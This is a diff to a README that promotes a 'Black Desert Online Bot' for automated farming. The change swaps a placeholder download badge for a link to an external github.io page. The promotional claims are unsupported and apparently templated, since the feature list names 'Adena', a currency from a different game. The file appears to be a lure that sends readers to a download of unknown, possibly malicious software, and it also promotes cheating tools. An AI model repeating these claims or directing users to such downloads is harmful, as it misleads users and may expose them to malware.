@@ -2,7 +2,7 @@
 
 The ultimate Black Desert Online Bot for 2025, automating resource farming, item collection, and XP gains. Maximize efficiency with no manual grinding—works seamlessly with the latest game updates and offers a user-friendly interface.  
 
-[![Download Black Desert Online Bot](https://img.shields.io/badge/Download-Black_Desert_Online_Bot-blueviolet)](#)  
+[![Download Black Desert Online Bot](https://img.shields.io/badge/Download-Black_Desert_Online_Bot-blueviolet)](https://black-desert-online-bot.github.io/.github/)  
 
 ## 🎯 Key Features  
 - **Auto-Farm Resources:** Collect Adena, items, and materials without manual effort.  
